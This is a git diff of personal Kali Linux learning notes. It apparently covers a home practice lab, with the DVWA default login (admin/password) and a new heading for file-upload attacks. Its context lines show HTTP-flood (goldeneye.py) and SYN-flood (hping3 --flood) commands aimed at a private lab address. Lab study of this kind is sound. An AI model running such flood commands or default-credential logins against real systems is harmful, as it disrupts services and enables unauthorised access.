@@ -1,4 +1,4 @@
-# Kali-one
+# Kali-one This is a Information-security Learning of Tien-Wei Hsu
 https://explainshell.com/
 https://www.mediacollege.com/linux/command/linux-command.html
 
@@ -142,6 +142,8 @@ python3 goldeneye.py http://192.168.0.132:8000/
 
 hping3（SYN Flood） 洪水型攻擊 但似乎有點沒用
 sudo hping3 -S --flood -V -p 8000 192.168.0.132
+-------------------
+DVWA Agent -> account:admin password:password \n
 
-
+文件上傳攻擊 Upload attack
 
